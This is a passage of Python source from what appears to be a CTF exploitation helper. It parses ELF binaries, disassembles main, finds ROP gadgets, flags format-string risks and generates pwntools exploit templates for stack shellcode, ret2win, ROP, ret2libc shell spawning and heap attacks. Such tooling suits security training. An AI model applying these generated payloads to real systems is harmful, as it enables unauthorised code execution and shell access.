            sh_off = e_shoff + i * e_shentsize
            if sh_off + e_shentsize > len(content):
                break

            name = _section_name(sh_off)
            sh_type = read_u32(sh_off + 4)

            if is_32:
                s_addr = read_u32(sh_off + 12)
                s_offset = read_u32(sh_off + 16)
                s_size = read_u32(sh_off + 20)
                s_link = read_u32(sh_off + 24)
                s_entsize = read_u32(sh_off + 36)
            else:
                s_addr = read_u64(sh_off + 16)
                s_offset = read_u64(sh_off + 24)
                s_size = read_u64(sh_off + 32)
                s_link = read_u32(sh_off + 40)
                s_entsize = read_u64(sh_off + 56)

            section_hdrs.append({
                "idx": i, "name": name, "type": sh_type,
                "offset": s_offset, "size": s_size, "addr": s_addr,
                "link": s_link, "entsize": s_entsize,
            })

            if name == ".text":
                text_offset, text_size, text_addr = s_offset, s_size, s_addr
            elif sh_type == 2:  # SHT_SYMTAB
                symtab_off, symtab_sz = s_offset, s_size
                symtab_entsize = s_entsize or (16 if is_32 else 24)
                symtab_link = s_link
            elif sh_type == 11:  # SHT_DYNSYM
                dynsym_off, dynsym_sz = s_offset, s_size
                dynsym_entsize = s_entsize or (16 if is_32 else 24)
                dynsym_link = s_link

        if text_size == 0:
            return empty

        # ── Helper: read string from a strtab section ──────────────────
        def _read_strtab_string(link_idx, str_idx):
            if link_idx >= len(section_hdrs):
                return ""
            st = section_hdrs[link_idx]
            base = st["offset"]
            sz = st["size"]
            if str_idx >= sz:
                return ""
            start = base + str_idx
            end = content.index(b"\x00", start) if b"\x00" in content[start:start + 256] else start
            return content[start:end].decode("ascii", errors="replace")

        # ── Search symbol tables for 'main' ────────────────────────────
        main_addr = 0
        main_size = 0
        main_name = ""

        def _find_main_in_symtab(sym_off, sym_sz, sym_entsz, link):
            nonlocal main_addr, main_size, main_name
            if sym_off == 0 or sym_sz == 0 or sym_entsz == 0:
                return False
            count = sym_sz // sym_entsz
            for j in range(count):
                ent = sym_off + j * sym_entsz
                if ent + sym_entsz > len(content):
                    break

                if is_32:
                    st_name = read_u32(ent)
                    st_value = read_u32(ent + 4)
                    st_size = read_u32(ent + 8)
                    st_info = content[ent + 12]
                else:
                    st_name = read_u32(ent)
                    st_info = content[ent + 4]
                    st_value = read_u64(ent + 8)
                    st_size = read_u64(ent + 16)

                # Only look at FUNC type symbols (STT_FUNC = 2)
                st_type = st_info & 0xf
                if st_type != 2:
                    continue

                fname = _read_strtab_string(link, st_name)
                if fname == "main":
                    main_addr = st_value
                    main_size = st_size
                    main_name = "main"
                    return True
            return False

        # Try .symtab first (has more symbols), then .dynsym
        if not _find_main_in_symtab(symtab_off, symtab_sz, symtab_entsize, symtab_link):
            _find_main_in_symtab(dynsym_off, dynsym_sz, dynsym_entsize, dynsym_link)

        # ── Determine disassembly target ───────────────────────────────
        if main_addr:
            # Disassemble main function
            target_addr = main_addr
            target_name = "main"
            max_insns = 100  # generous limit for main
            stop_on_ret = True
        else:
            # Fall back to entry point
            target_addr = e_entry
            target_name = "_start (entry point)"
            max_insns = 50
            stop_on_ret = False

        # Convert virtual address to file offset within .text
        if target_addr < text_addr or target_addr >= text_addr + text_size:
            # Target is outside .text — use entry point offset heuristic
            # For non-PIE: entry is typically at 0x400000 + file_offset region
            disasm_file_offset = text_offset
            disasm_vaddr = text_addr
        else:
            offset_in_text = target_addr - text_addr
            disasm_file_offset = text_offset + offset_in_text
            disasm_vaddr = target_addr

        # Limit how much data we read (main_size if known, else 2048 bytes)
        read_limit = main_size if main_size > 0 else 2048
        read_limit = min(read_limit, 8192)  # safety cap
        disasm_data = content[disasm_file_offset:disasm_file_offset + read_limit]

        if not disasm_data:
            return empty

        # ── Map architecture to capstone ───────────────────────────────
        cs_arch = capstone.CS_ARCH_X86
        cs_mode = capstone.CS_MODE_64

        if is_32:
            arch_map = {3: (capstone.CS_ARCH_X86, capstone.CS_MODE_32),
                        40: (capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM),
                        8: (capstone.CS_ARCH_MIPS, capstone.CS_MODE_MIPS32)}
            cs_arch, cs_mode = arch_map.get(e_machine, (capstone.CS_ARCH_X86, capstone.CS_MODE_32))
        else:
            arch_map = {62: (capstone.CS_ARCH_X86, capstone.CS_MODE_64),
                        183: (capstone.CS_ARCH_ARM64, capstone.CS_MODE_ARM),
                        8: (capstone.CS_ARCH_MIPS, capstone.CS_MODE_MIPS64)}
            cs_arch, cs_mode = arch_map.get(e_machine, (capstone.CS_ARCH_X86, capstone.CS_MODE_64))

        if ei_data == 2:
            cs_mode |= capstone.CS_MODE_BIG_ENDIAN
        else:
            cs_mode |= capstone.CS_MODE_LITTLE_ENDIAN

        # ── Disassemble ────────────────────────────────────────────────
        md = capstone.Cs(cs_arch, cs_mode)
        instructions = []

        for insn in md.disasm(disasm_data, disasm_vaddr):
            instructions.append({
                "address": f"0x{insn.address:x}",
                "mnemonic": insn.mnemonic,
                "op_str": insn.op_str,
            })

            # Stop at ret after we've seen enough of the function (≥10 insns)
            if stop_on_ret and len(instructions) >= 10:
                mn = insn.mnemonic.lower()
                if mn in ("ret", "retn", "retf"):
                    break

            if len(instructions) >= max_insns:
                break

        return {
            "function": target_name,
            "instructions": instructions,
        }

    except Exception:
        return empty


# ---------------------------------------------------------------------------
# Pwntools exploit template generator
# ---------------------------------------------------------------------------
def generate_pwn_template(
    filename: str,
    content: bytes,
    checksec: dict,
    patterns: dict[str, list[str]],
    strings_list: list[str],
    overflow_hint: dict | None = None,
    rop_gadgets: list[dict] | None = None,
    libc_info: dict | None = None,
) -> str:
    """
    Generate a Python pwntools exploit template based on deep static analysis.

    The template includes:
    • Architecture detection from ELF magic bytes (class + e_machine)
    • Automatic win function detection (win, get_flag, print_flag, shell, backdoor, secret)
    • Architecture-correct cyclic pattern commands (32 vs 64-bit)
    • Pre-filled menu interaction from actual detected menu strings
    • One-liner offset finder using corefile
    • Binary base address comments when PIE is disabled
    • Pre-filled protections from checksec
    • Payload scaffold based on detected exploit technique
    • Predicted buffer overflow offset (from disassembly analysis)
    • Discovered ROP gadgets listed as comments
    • ret2libc section when libc version is identified
    """

    # ── 1. Detect architecture from ELF header ─────────────────────────
    arch = "amd64"  # default
    bits = 64
    endian = "little"
    is_elf = False

    if len(content) >= 20 and content[:4] == b"\x7fELF":
        is_elf = True
        ei_class = content[4]      # 1 = 32-bit, 2 = 64-bit
        ei_data = content[5]       # 1 = little-endian, 2 = big-endian
        endian = "little" if ei_data == 1 else "big"

        e_machine = int.from_bytes(content[18:20], endian)

        if ei_class == 1:
            bits = 32
            arch_map = {3: "i386", 40: "arm", 8: "mips"}
            arch = arch_map.get(e_machine, "i386")
        else:
            bits = 64
            arch_map = {62: "amd64", 183: "aarch64", 8: "mips64"}
            arch = arch_map.get(e_machine, "amd64")

    # ── 2. Win function detection (prioritized) ────────────────────────
    win_function_names = [
        "win", "get_flag", "print_flag", "read_flag", "cat_flag",
        "shell", "get_shell", "spawn_shell",
        "backdoor", "secret", "flag",
        "system",  # only as custom function, not libc
    ]
    func_re = re.compile(r'^[a-zA-Z_][a-zA-Z0-9_]{2,40}$')
    libc_funcs = {
        "printf", "puts", "gets", "fgets", "scanf", "read", "write",
        "malloc", "free", "realloc", "calloc", "system", "execve",
        "open", "close", "strcpy", "strncpy", "strcmp", "strlen",
        "memcpy", "memset", "memmove", "fopen", "fread", "fwrite",
        "fclose", "setbuf", "setvbuf", "exit", "_exit", "atoi",
        "strtol", "sprintf", "snprintf", "fprintf", "alarm",
        "signal", "mprotect", "mmap", "munmap",
    }

    known_funcs: list[str] = []
    custom_funcs: list[str] = []
    win_func: str | None = None
    all_win_candidates: list[str] = []

    for s in strings_list:
        s_stripped = s.strip()
        if not func_re.match(s_stripped) or len(s_stripped) <= 2:
            continue

        if s_stripped in libc_funcs:
            known_funcs.append(s_stripped)
            continue

        # Skip common ELF/compiler noise
        if s_stripped in ("ELF", "GNU", "GCC", "GLIBC", "GLIBCXX", "CXXABI"):
            continue

        if s_stripped[0].isupper() or "_" in s_stripped:
            custom_funcs.append(s_stripped)

        # Check against win function names
        s_low = s_stripped.lower()
        for wname in win_function_names:
            if wname == s_low or s_low.startswith(wname) or s_low.endswith(wname):
                # Don't count 'system' from libc as win
                if s_stripped != "system":
                    all_win_candidates.append(s_stripped)
                break

    known_funcs = list(dict.fromkeys(known_funcs))[:15]
    custom_funcs = list(dict.fromkeys(custom_funcs))[:15]
    all_win_candidates = list(dict.fromkeys(all_win_candidates))

    # Pick best win function by priority
    if all_win_candidates:
        # Prefer exact matches first
        for wname in win_function_names:
            for cand in all_win_candidates:
                if cand.lower() == wname:
                    win_func = cand
                    break
            if win_func:
                break
        if not win_func:
            win_func = all_win_candidates[0]

    # ── 3. Parse menu options from strings ─────────────────────────────
    menu_re = re.compile(r'^(\d+)[).\]:\-]\s*(.+)', re.IGNORECASE)
    menu_options: list[tuple[str, str]] = []  # (number, description)
    menu_prompt: str | None = None

    for s in strings_list:
        s_stripped = s.strip()
        m = menu_re.match(s_stripped)
        if m:
            num, desc = m.group(1), m.group(2).strip()
            if len(desc) > 2 and len(desc) < 60:
                menu_options.append((num, desc))

        # Detect menu prompt characters
        s_low = s_stripped.lower()
        if any(p in s_low for p in ("choice", "option", "select", "enter your", ">>", "> ")):
            if len(s_stripped) < 40:
                menu_prompt = s_stripped

    menu_options = menu_options[:8]  # cap

    # ── 4. Build protections string ────────────────────────────────────
    nx_val = checksec.get("nx")
    pie_val = checksec.get("pie")
    canary_val = checksec.get("canary")
    relro_val = checksec.get("relro")
    fortify_val = checksec.get("fortify")

    prot_parts = []
    if nx_val is not None:
        prot_parts.append(f"NX={'Enabled' if nx_val else 'Disabled'}")
    if pie_val is not None:
        prot_parts.append(f"PIE={'Enabled' if pie_val else 'Disabled'}")
    if canary_val is not None:
        prot_parts.append(f"Canary={'Enabled' if canary_val else 'Disabled'}")
    if relro_val is not None:
        prot_parts.append(f"RELRO={'Enabled' if relro_val else 'Disabled'}")
    if fortify_val is not None:
        prot_parts.append(f"Fortify={'Enabled' if fortify_val else 'Disabled'}")
    protections_line = ", ".join(prot_parts) if prot_parts else "Unknown"

    # ── 5. Build hints from patterns ───────────────────────────────────
    hints = []
    if patterns.get("dangerous_functions"):
        funcs = ", ".join(patterns["dangerous_functions"][:3])
        hints.append(f"Dangerous function(s) detected: {funcs}")
        if any("gets" in f for f in patterns["dangerous_functions"]):
            hints.append("gets() detected — classic buffer overflow target")
        if any("strcpy" in f for f in patterns["dangerous_functions"]):
            hints.append("strcpy() detected — potential buffer overflow")
        if any("system" in f for f in patterns["dangerous_functions"]):
            hints.append("system() call found — possible ret2system target")

    if patterns.get("flag_reads"):
        hints.append("flag.txt / flag reference — find the win condition")

    if patterns.get("win_conditions"):
        hints.append("Win condition detected — redirect control flow here")

    if patterns.get("memory_functions"):
        hints.append("Heap functions (malloc/free) — consider heap exploitation")

    if patterns.get("menu_driven"):
        hints.append("Menu-driven program — look for UAF, double-free, or heap overflow")

    if patterns.get("stack_protection"):
        hints.append("Stack canary enabled — need canary leak or bypass")

    if patterns.get("glibc_versions"):
        ver = patterns["glibc_versions"][0]
        hints.append(f"GLIBC version: {ver}")

    if patterns.get("file_operations"):
        hints.append("File operations detected — check for path traversal or read primitives")

    # ── 6. Determine exploit technique ─────────────────────────────────
    technique = "buffer_overflow"  # default
    if patterns.get("memory_functions") and patterns.get("menu_driven"):
        technique = "heap"
    elif pie_val is False and nx_val is True and patterns.get("dangerous_functions"):
        technique = "rop"
    elif nx_val is False:
        technique = "shellcode"

    # ── 7. Architecture-specific values ────────────────────────────────
    p32_or_64 = "p32" if bits == 32 else "p64"
    cyclic_find_val = "0x61616161" if bits == 32 else "0x6161616161616161"
    word_size = 4 if bits == 32 else 8

    # ── 8. Assemble template ───────────────────────────────────────────
    lines = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        f"# Binary: {filename}",
        f"# Architecture: {arch} ({bits}-bit, {'little' if endian == 'little' else 'big'}-endian)",
        f"# Protections: {protections_line}",
        "",
        f'binary = "./{filename}"',
        "elf = ELF(binary)",
        f"context.arch = '{arch}'",
        "context.log_level = 'info'",
        "",
    ]

    # Libc loading hint
    lines.append("# libc = ELF('./libc.so.6')  # uncomment if you have the target libc")
    lines.append("")

    # PIE disabled — add base address comment
    if pie_val is False:
        lines.append("# PIE is disabled — addresses are fixed:")
        lines.append("# binary_base = elf.address  # default: 0x400000 (64-bit) or 0x8048000 (32-bit)")
        if bits == 32:
            lines.append("# elf.address = 0x8048000")
        else:
            lines.append("# elf.address = 0x400000")
        lines.append("")

    # Win function — FOUND banner
    if win_func:
        lines.append(f"# ╔══════════════════════════════════════════╗")
        lines.append(f"# ║  WIN FUNCTION FOUND: {win_func:<20s} ║")
        lines.append(f"# ╚══════════════════════════════════════════╝")
        lines.append(f"win = elf.sym['{win_func}']  # WIN FUNCTION FOUND!")
        if len(all_win_candidates) > 1:
            others = [c for c in all_win_candidates if c != win_func]
            lines.append(f"# Other candidates: {', '.join(others)}")
        lines.append("")

    # Known functions
    if custom_funcs:
        lines.append("# Custom functions detected in binary:")
        for fn in custom_funcs[:10]:
            lines.append(f"#   - {fn}")
        lines.append("")

    if known_funcs:
        lines.append("# Known libc functions used:")
        lines.append(f"#   {', '.join(known_funcs[:10])}")
        lines.append("")

    # Hints
    if hints:
        lines.append("# ═══ Analysis Hints ═══")
        for h in hints:
            lines.append(f"# → {h}")
        lines.append("")

    # ── ROP Gadgets (from static analysis) ─────────────────────────────
    if rop_gadgets:
        lines.append("# ═══ ROP Gadgets Found ═══")
        for g in rop_gadgets[:15]:
            addr = g.get("address", "???")
            gadget = g.get("gadget", "???")
            lines.append(f"# {addr}: {gadget}")
        if len(rop_gadgets) > 15:
            lines.append(f"# ... and {len(rop_gadgets) - 15} more gadgets")
        lines.append("")

    # ── Offset finder ──────────────────────────────────────────────────
    predicted_offset = None
    if overflow_hint and overflow_hint.get("likely_offset"):
        predicted_offset = overflow_hint["likely_offset"]
        stack_size = overflow_hint.get("stack_size", 0)
        evidence = overflow_hint.get("evidence", "")
        confidence = overflow_hint.get("confidence", "Low")
        lines.append("# ═══ Predicted Offset ═══")
        lines.append(f"# Confidence: {confidence}")
        lines.append(f"# {evidence}")
        lines.append("")
    else:
        lines.append("# ═══ Find Offset ═══")
        lines.append("# RUN THIS FIRST to find the buffer overflow offset:")
        lines.append(f"# python3 -c \"from pwn import *; p=process('./{filename}'); p.sendline(cyclic(200)); p.wait(); core=p.corefile; print(cyclic_find(core.fault_addr))\"")
        lines.append("")
        lines.append(f"# Or manually:")
        lines.append(f"# 1. Send cyclic(200) to the binary")
        lines.append(f"# 2. Check crash address in debugger")
        if bits == 32:
            lines.append(f"# 3. offset = cyclic_find(0x61616161)  # 32-bit: 'aaaa' pattern")
        else:
            lines.append(f"# 3. offset = cyclic_find(0x6161616161616161)  # 64-bit: 'aaaaaaaa' pattern")
        lines.append("")

    # Connection setup
    lines.extend([
        "# ═══ Connection ═══",
        "p = process(binary)",
        '# p = remote("target.ctf.com", 1337)  # for remote exploit',
        "",
    ])

    # ── Technique-specific scaffold ────────────────────────────────────
    if technique == "shellcode":
        if predicted_offset:
            offset_line = f"offset = {predicted_offset}  # predicted from: sub rsp, 0x{overflow_hint.get('stack_size', 0):x}"
        else:
            offset_line = f"offset = 0  # TODO: replace with value from cyclic_find({cyclic_find_val})"
        lines.extend([
            "# ═══ Shellcode Exploit (NX disabled) ═══",
            "# NX is disabled — you can execute shellcode on the stack",
            "shellcode = asm(shellcraft.sh())",
            "",
            offset_line,
            "",
            "payload = flat(",
            "    shellcode,",
            f"    b'A' * (offset - len(shellcode)),",
            f"    # {p32_or_64}(stack_addr),  # return address → shellcode on stack",
            ")",
        ])
    elif technique == "heap":
        lines.extend([
            "# ═══ Heap Exploit Template ═══",
            "# Menu-driven program with heap operations detected",
            "",
        ])

        # Generate menu helpers from parsed menu options
        prompt_bytes = f"b'{menu_prompt}'" if menu_prompt else "b'> '"

        if menu_options:
            lines.append("# Detected menu options:")
            for num, desc in menu_options:
                lines.append(f"#   {num}) {desc}")
            lines.append("")

            # Generate wrapper functions based on detected menu text
            func_names_generated = set()
            for num, desc in menu_options[:4]:
                # Derive function name from description
                desc_lower = desc.lower()
                if any(w in desc_lower for w in ("add", "create", "new", "alloc")):
                    fname = "create"
                elif any(w in desc_lower for w in ("delete", "remove", "free", "destroy")):
                    fname = "delete"
                elif any(w in desc_lower for w in ("show", "view", "print", "display", "read", "get")):
                    fname = "show"
                elif any(w in desc_lower for w in ("edit", "modify", "update", "change")):
                    fname = "edit"
                elif any(w in desc_lower for w in ("exit", "quit", "leave")):
                    continue  # skip exit option
                else:
                    fname = f"option_{num}"

                if fname in func_names_generated:
                    fname = f"{fname}_{num}"
                func_names_generated.add(fname)

                lines.append(f"def {fname}(data=b'A'):")
                lines.append(f"    p.sendlineafter({prompt_bytes}, b'{num}')")
                lines.append(f"    # TODO: fill in expected prompts for '{desc}'")
                lines.append(f"    # p.sendlineafter(b':', data)")
                lines.append("")
        else:
            # Fallback generic menu helpers
            lines.extend([
                f"def create(size, data=b'A'):",
                f"    p.sendlineafter({prompt_bytes}, b'1')",
                "    p.sendlineafter(b'size', str(size).encode())",
                "    p.sendafter(b'data', data)",
                "",
                "def delete(idx):",
                f"    p.sendlineafter({prompt_bytes}, b'2')",
                "    p.sendlineafter(b'index', str(idx).encode())",
                "",
                "def show(idx):",
                f"    p.sendlineafter({prompt_bytes}, b'3')",
                "    p.sendlineafter(b'index', str(idx).encode())",
                "    return p.recvline()",
                "",
            ])

        lines.extend([
            "# TODO: Implement exploit",
            "# Common techniques: UAF, tcache poisoning, fastbin dup, house-of-force",
        ])
    elif technique == "rop":
        if predicted_offset:
            offset_line = f"offset = {predicted_offset}  # predicted from: sub rsp, 0x{overflow_hint.get('stack_size', 0):x}"
        else:
            offset_line = f"offset = 0  # TODO: replace with value from cyclic_find({cyclic_find_val})"
        lines.extend([
            "# ═══ ROP Exploit (NX enabled, no PIE) ═══",
            "# Use ROP gadgets to build a chain",
            "rop = ROP(elf)",
            "",
            offset_line,
            "",
        ])
        if win_func:
            lines.extend([
                "# Direct ret2win — win function detected!",
            ])
            if bits == 64:
                lines.extend([
                    "# NOTE: 64-bit requires stack alignment (ret gadget before win)",
                    "ret = rop.find_gadget(['ret'])[0]  # stack alignment",
                    "",
                    "payload = flat(",
                    "    b'A' * offset,",
                    "    p64(ret),       # stack alignment for movaps",
                    f"    p64(win),       # → {win_func}",
                    ")",
                ])
            else:
                lines.extend([
                    "payload = flat(",
                    "    b'A' * offset,",
                    f"    p32(win),       # → {win_func}",
                    ")",
                ])
        else:
            lines.extend([
                "# Option 1: ret2system (if system@plt exists)",
                f"# bin_sh = next(elf.search(b'/bin/sh'))",
            ])
            if bits == 64:
                lines.extend([
                    "# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]",
                    "# ret = rop.find_gadget(['ret'])[0]",
                    "# payload = flat(",
                    "#     b'A' * offset,",
                    "#     p64(ret),",
                    "#     p64(pop_rdi),",
                    "#     p64(bin_sh),",
                    "#     p64(elf.plt['system']),",
                    "# )",
                ])
            else:
                lines.extend([
                    "# payload = flat(",
                    "#     b'A' * offset,",
                    "#     p32(elf.plt['system']),",
                    "#     p32(0xdeadbeef),  # fake return address",
                    "#     p32(bin_sh),",
                    "# )",
                ])
            lines.extend([
                "",
                "# Option 2: Auto-build ROP chain",
                "payload = flat(",
                f"    b'A' * offset,",
                "    rop.chain(),",
                ")",
            ])
    else:
        # Generic buffer overflow
        if predicted_offset:
            offset_line = f"offset = {predicted_offset}  # predicted from: sub rsp, 0x{overflow_hint.get('stack_size', 0):x}"
        else:
            offset_line = f"offset = 0  # TODO: replace with value from cyclic_find({cyclic_find_val})"
        lines.extend([
            "# ═══ Buffer Overflow Template ═══",
            offset_line,
            "",
            "payload = flat(",
            f"    b'A' * offset,",
        ])
        if win_func:
            if bits == 64:
                lines.append("    # NOTE: 64-bit may need ret gadget for stack alignment")
                lines.append(f"    # ret = ROP(elf).find_gadget(['ret'])[0]")
                lines.append(f"    # p64(ret),")
                lines.append(f"    p64(win),       # → {win_func}")
            else:
                lines.append(f"    p32(win),       # → {win_func}")
        else:
            lines.append(f"    # {p32_or_64}(elf.sym['win_function']),  # replace with actual target")
        lines.append(")")

    # ── ret2libc section (when libc version is identified) ─────────────
    libc_version = (libc_info or {}).get("glibc_version")
    if libc_version:
        likely_os = (libc_info or {}).get("likely_os", "Unknown")
        libc_db_url = (libc_info or {}).get("libc_db_url", "")
        lines.extend([
            "",
            "# ═══ ret2libc Section ═══",
            f"# Detected GLIBC version: {libc_version} (likely {likely_os})",
            f"# Libc database: {libc_db_url}" if libc_db_url else "",
            "#",
            "# To use ret2libc, you need the target's libc:",
            "#   1. Leak a GOT address (e.g., puts@GOT)",
            "#   2. Look up the libc version at https://libc.blukat.me/",
            "#   3. Calculate system() and /bin/sh offsets",
            "#",
            "# libc = ELF('./libc.so.6')",
            "# libc.address = leaked_puts - libc.sym['puts']",
            "# system_addr = libc.sym['system']",
            "# bin_sh_addr = next(libc.search(b'/bin/sh'))",
        ])
        if bits == 64:
            lines.extend([
                "#",
                "# # 64-bit ret2libc payload:",
                "# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]",
                "# ret = rop.find_gadget(['ret'])[0]",
                "# payload_libc = flat(",
                "#     b'A' * offset,",
                "#     p64(ret),          # stack alignment",
                "#     p64(pop_rdi),",
                "#     p64(bin_sh_addr),",
                "#     p64(system_addr),",
                "# )",
            ])
        else:
            lines.extend([
                "#",
                "# # 32-bit ret2libc payload:",
                "# payload_libc = flat(",
                "#     b'A' * offset,",
                "#     p32(system_addr),",
                "#     p32(0xdeadbeef),   # fake return address",
                "#     p32(bin_sh_addr),",
                "# )",
            ])
        lines.append("")

    # Send payload and interact
    lines.extend([
        "",
        "# ═══ Send & Interact ═══",
        "p.sendline(payload)",
        "p.interactive()",
        "",
    ])

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Deep Static Analysis Helpers
# ---------------------------------------------------------------------------
import io
from elftools.elf.elffile import ELFFile

def get_function_list(elffile):
    functions = []
    symtab = elffile.get_section_by_name('.symtab')
    if not symtab:
        symtab = elffile.get_section_by_name('.dynsym')
    if symtab:
        for symbol in symtab.iter_symbols():
            if symbol['st_info']['type'] == 'STT_FUNC' and symbol.name:
                functions.append({
                    "name": symbol.name,
                    "address": hex(symbol['st_value']),
                    "size": symbol['st_size']
                })
    return functions


def get_imports_exports(elffile):
    imports = []
    exports = []
    
    dynsym = elffile.get_section_by_name('.dynsym')
    if dynsym:
        for symbol in dynsym.iter_symbols():
            if symbol['st_shndx'] == 'SHN_UNDEF':
                if symbol.name:
                    imports.append(symbol.name)
            elif symbol['st_info']['type'] == 'STT_FUNC':
                if symbol.name:
                    exports.append(symbol.name)
    
    return {"imports": imports, "exports": exports}

def calculate_cvss_score(patterns: dict[str, list[str]], flags_detected: list[str], checksec: dict):
    base_score = 0.0
    
    nx = checksec.get("nx", True)
    canary = checksec.get("canary", True)
    pie = checksec.get("pie", True)
    
    vuln_score = 0.0
    if nx is False: vuln_score += 2.5
    if canary is False: vuln_score += 2.0
    if pie is False: vuln_score += 1.5
    
    if patterns.get("dangerous_functions"):
        vuln_score += 3.0
    if patterns.get("flag_reads") or flags_detected:
        vuln_score += 2.0
    if patterns.get("memory_functions"):
        vuln_score += 1.0
        
    score = min(vuln_score, 10.0)
    
    if score >= 9.0:
        severity = "Critical"
    elif score >= 7.0:
        severity = "High"
    elif score >= 4.0:
        severity = "Medium"
    elif score > 0.0:
        severity = "Low"
    else:
        severity = "None"
        
    return {"cvss_score": round(score, 1), "cvss_severity": severity}

def analyze_data_flow(disassembly: list[dict], patterns: dict):
    flows = []
    input_funcs = ["gets", "fgets", "scanf", "read"]
    dangerous_sinks = ["system", "execve", "strcpy", "sprintf"]
    
    found_inputs = []
    for insn in disassembly:
        if insn["mnemonic"] == "call":
            op = insn["op_str"]
            for fun in input_funcs:
                if fun in op:
                    found_inputs.append(fun)
            for fun in dangerous_sinks:
                if fun in op and found_inputs:
                    flows.append(f"Input enters at {found_inputs[-1]}() → passes through registers/stack → potentially flows into dangerous sink {fun}()")
                    
    if found_inputs and not flows:
        flows.append(f"Input enters at {found_inputs[-1]}() → stored in stack/heap wrapper → no immediate dangerous sink branch detected in this block.")
        
    if not flows:
        flows.append("No obvious linear data flow from input to sink found in disassembled block.")
        
    return flows


# ---------------------------------------------------------------------------
# ROP Gadget finder (capstone-based)
# ---------------------------------------------------------------------------
def find_rop_gadgets(content: bytes, arch: str = "x86_64") -> list[dict]:
    """
    Scan the .text section of an ELF binary for useful ROP gadgets using capstone.

    Looks for common patterns: ret, pop REG; ret, syscall; ret, leave; ret.
    Returns a list of dicts: [{"address": "0x401234", "gadget": "pop rdi; ret"}]
    Max 20 gadgets returned, deduplicated by gadget text.
    """
    try:
        import capstone
    except ImportError:
        return []

    if not content.startswith(b"\x7fELF"):
        return []

    # Desired gadget patterns (mnemonic sequences ending in ret)
    WANTED_GADGETS = [
        ("ret",),
        ("pop rdi", "ret"),
        ("pop rsi", "ret"),
        ("pop rdx", "ret"),
        ("pop rax", "ret"),
        ("pop rbx", "ret"),
        ("pop rcx", "ret"),
        ("pop rbp", "ret"),
        ("syscall", "ret"),
        ("leave", "ret"),
        ("pop rdi", "pop rsi", "ret"),
        ("pop rsi", "pop r15", "ret"),
        # 32-bit equivalents
        ("pop edi", "ret"),
        ("pop esi", "ret"),
        ("pop ebx", "ret"),
        ("pop eax", "ret"),
        ("int 0x80",),
    ]

    try:
        from elftools.elf.elffile import ELFFile
        import io as _io

        elf = ELFFile(_io.BytesIO(content))
        text_section = elf.get_section_by_name('.text')
        if not text_section:
            return []

        text_data = text_section.data()
        text_addr = text_section['sh_addr']

        # Determine arch/mode
        is_32 = elf.elfclass == 32
        if is_32:
            cs_mode = capstone.CS_MODE_32
        else:
            cs_mode = capstone.CS_MODE_64

        ei_data = elf.header['e_ident']['EI_DATA']
        if ei_data == 'ELFDATA2MSB':
            cs_mode |= capstone.CS_MODE_BIG_ENDIAN
        else:
            cs_mode |= capstone.CS_MODE_LITTLE_ENDIAN

        md = capstone.Cs(capstone.CS_ARCH_X86, cs_mode)

        # Scan for gadgets: search backwards from every ret/syscall/int
        gadgets: list[dict] = []
        seen_gadgets: set[str] = set()
        MAX_GADGET_LEN = 6  # max instructions in a gadget
        MAX_GADGETS = 20

        # Find all ret offsets in .text
        for offset in range(len(text_data)):
            # 0xc3 = ret, 0xcb = retf
            if text_data[offset] not in (0xc3, 0xcb, 0x0f):
                continue
            # 0x0f 0x05 = syscall
            if text_data[offset] == 0x0f:
                if offset + 1 < len(text_data) and text_data[offset + 1] == 0x05:
                    pass  # syscall
                else:
                    continue

            # Try disassembling a few bytes before this point
            for back in range(1, MAX_GADGET_LEN * 8):
                start = offset - back
                if start < 0:
                    break
                chunk = text_data[start:offset + 2]  # +2 for 2-byte opcodes
                insns = list(md.disasm(chunk, text_addr + start))
                if not insns:
                    continue

                # Check if the last instruction ends exactly at offset (or offset+1 for syscall)
                last_insn = insns[-1]
                last_end = last_insn.address + last_insn.size - (text_addr + start)
                expected_end = (offset + 2 if text_data[offset] == 0x0f else offset + 1)
                if start + last_end != expected_end:
                    continue

                # Build mnemonic sequence
                mnemonic_seq = tuple(
                    f"{i.mnemonic} {i.op_str}".strip() if i.op_str else i.mnemonic
                    for i in insns
                )

                # Check against wanted patterns (prefix match)
                for wanted in WANTED_GADGETS:
                    if len(insns) == len(wanted):
                        match = True
                        for got, want in zip(mnemonic_seq, wanted):
                            if want not in got:
                                match = False
                                break
                        if match:
                            gadget_str = " ; ".join(mnemonic_seq)
                            if gadget_str not in seen_gadgets:
                                seen_gadgets.add(gadget_str)
                                gadgets.append({
                                    "address": f"0x{insns[0].address:x}",
                                    "gadget": gadget_str,
                                })
                            break

                if len(gadgets) >= MAX_GADGETS:
                    break
            if len(gadgets) >= MAX_GADGETS:
                break

        return gadgets[:MAX_GADGETS]

    except Exception as e:
        logger.warning("ROP gadget scan failed: %s", e)
        return []


# ---------------------------------------------------------------------------
# Format String Vulnerability Detector
# ---------------------------------------------------------------------------
def detect_format_string(strings: list[str], patterns: dict) -> dict:
    """
    Detect potential format string vulnerabilities.

    Checks if printf/fprintf/sprintf are used and whether user-controlled
    format specifiers (%s, %p, %x, %n) are present in nearby strings.

    Returns:
        {"vulnerable": bool, "evidence": list[str], "severity": "High"|"Medium"|"Low"}
    """
    printf_funcs = ("printf", "fprintf", "sprintf", "snprintf", "syslog", "err", "warn")
    fmt_specifiers = ("%n", "%x", "%p", "%s", "%d", "%hn", "%hhn", "%ln")
    dangerous_specs = ("%n", "%hn", "%hhn", "%ln")

    evidence: list[str] = []
    has_printf = False
    has_dangerous_spec = False
    has_any_spec = False

    for s in strings:
        s_lower = s.lower()

        # Check for printf-family functions
        for fn in printf_funcs:
            if fn in s_lower:
                has_printf = True
                # Check if the function call lacks a literal format string
                # (heuristic: printf is in the string but no "%" immediately follows)
                if fn in s and "%" not in s:
                    evidence.append(f"{fn}() called — potential user-controlled format string")
                break

        # Check for format specifiers in strings (user input patterns)
        for spec in fmt_specifiers:
            if spec in s:
                has_any_spec = True
                if spec in dangerous_specs:
                    has_dangerous_spec = True
                    evidence.append(f"Dangerous format specifier '{spec}' found in: {s[:80]}")
                break

    # Also check if dangerous_functions from patterns contains printf-family
    dangerous = patterns.get("dangerous_functions", [])
    for d in dangerous:
        d_lower = d.lower()
        for fn in printf_funcs:
            if fn in d_lower:
                has_printf = True
                break

    vulnerable = has_printf and (has_dangerous_spec or has_any_spec)

    if has_dangerous_spec:
        severity = "High"
    elif has_printf and has_any_spec:
        severity = "Medium"
